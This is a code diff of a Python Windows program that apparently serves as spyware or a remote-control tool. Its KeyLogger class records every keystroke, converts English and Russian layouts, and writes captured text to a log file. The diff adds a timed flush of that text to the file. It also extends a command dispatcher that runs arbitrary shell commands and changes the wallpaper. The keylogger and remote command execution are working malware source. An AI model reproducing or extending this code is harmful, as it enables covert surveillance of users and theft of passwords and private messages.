@@ -142,14 +142,23 @@ class KeyLogger:
         hllDll = WinDLL("User32.dll")
         return hllDll.GetKeyState(0x14) & 0xffff != 0
 
-    def get_layout(self):
-        hwnd = self.user32.GetForegroundWindow()
-        threadID = self.user32.GetWindowThreadProcessId(hwnd, None)
-        CodeLang = self.user32.GetKeyboardLayout(threadID)
-        if CodeLang == 0x4090409:
+    def get_layout(self, not_current=False):
+        user32 = ctypes.WinDLL('user32', use_last_error=True)
+        window = user32.GetForegroundWindow()
+        thread_id = user32.GetWindowThreadProcessId(window, 0)
+        klid = user32.GetKeyboardLayout(thread_id)
+        lid = klid & (2 ** 16 - 1)
+        lid_hex = hex(lid)
+        if lid in [0x409, 0x809, 0x0c09, 0x2809, 0x1009,
+                   0x2409, 0x3c09, 0x4009, 0x3809, 0x1809,
+                   0x2009, 0x4409, 0x1409, 0x3409, 0x4809,
+                   0x1c09, 0x2c09, 0x3009]:
             return 'en'
-        if CodeLang == 0x4190419:
+        elif lid in [0x419, 0x819]:
             return 'ru'
+        if not not_current:
+            return self.get_layout(not_current=True)
+        return lid
 
     def on_press(self, key):
         layout = self.get_layout()
@@ -166,7 +175,7 @@ class KeyLogger:
                         key_name = self._trans_table_en_to_ru[key_name]
                 else:
                     if self.debug:
-                        raise ValueError('undetectable layout')
+                        raise ValueError(f'undetectable layout: "{layout}"')
                 if key_name.isprintable():
                     if self.get_caps_state():
                         if key_name.islower():
@@ -209,16 +218,19 @@ class KeyLogger:
         self.previous_log = s
 
     def check_temp_output(self):
-        if len(self.output) >= self.output_max_temp_symbols:
+        if len(self.output) >= self.output_max_temp_symbols or \
+                time.time() - self.output_timer >= 10:
             if not self.debug:
                 with open(self.filename, 'a') as f:
                     f.write(self.output)
             else:
                 print(self.output, end='')
+                if len(self.output) < self.output_max_temp_symbols:
+                    print('timeout')
+            self.output_timer = time.time()
             self.output = ''
 
     def start(self, filename):
-        self.user32 = windll.user32
         self._eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
         self._rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
         self._trans_table_en_to_ru = dict(zip(self._eng_chars, self._rus_chars))
@@ -229,9 +241,12 @@ class KeyLogger:
         with open(self.filename, 'a') as f:
             f.write('\n<---------->\n')
         self.output = ''
-        self.output_max_temp_symbols = 100
+        self.output_max_temp_symbols = 50
+        self.output_timer = time.time()
+        self.output_timeout = 10
         if self.debug:
-            self.output_max_temp_symbols = 1
+            # self.output_max_temp_symbols = 1
+            ...
 
         key_listener = keyboard.Listener(on_press=self.on_press)
         key_listener.start()
@@ -239,10 +254,17 @@ class KeyLogger:
         mouse_listener.start()
 
 
-def cmd(s: str, directory='', v=False):
+def cmd(*args, **kwargs):
+    try:
+        return pre_cmd(*args, **kwargs)
+    except Exception as e:
+        return f'Error: "{str(e).encode("cp866")}"'
+
+
+def pre_cmd(s: str, directory='', v=False):
     global current_path, infoA, cursor_down
     if v:
-        return 8, 2
+        return 9, 0
 
     # ?
     variables = {
@@ -294,14 +316,14 @@ def cmd(s: str, directory='', v=False):
             if p == 'A':
                 infoA = not infoA
                 return str(infoA).encode('cp866')
-            ims = os.listdir(variables['im'])
+            ims = os.listdir(variables['images'])
             if p in map(lambda j: j if '.' not in j else j[:j.rfind('.')], ims):
                 for i in ['.jpg', '.png', '.bmp']:
                     if p + i in ims:
                         p = p + i
                         break
-            if os.path.exists(os.path.join(variables['im'], p)):
-                set_wallpaper(os.path.join(variables['im'], p), infoA)
+            if os.path.exists(os.path.join(variables['images'], p)):
+                set_wallpaper(os.path.join(variables['images'], p), infoA)
                 return b''
             return 'No such im'.encode('cp866')
         else:
@@ -376,15 +398,15 @@ def cmd(s: str, directory='', v=False):
         return 'Wrong syntax'.encode('cp866')
     elif cmd_name == '.get_layout':
         if not args:
-            return keylogger.get_layout().encode('cp866')
+            return str(keylogger.get_layout()).encode('cp866')
         return 'Wrong syntax'.encode('cp866')
     elif s[0] != '.':
         if s[0] == '?':
             msg = command(s[1:], True)
             return msg
-        else:
-            command(s)
-            return b''
+        elif s[0] == '!':
+            command(s[1:])
+            return 'Submitted'.encode('cp866')
     return 'No such command'.encode('cp866')
 
 
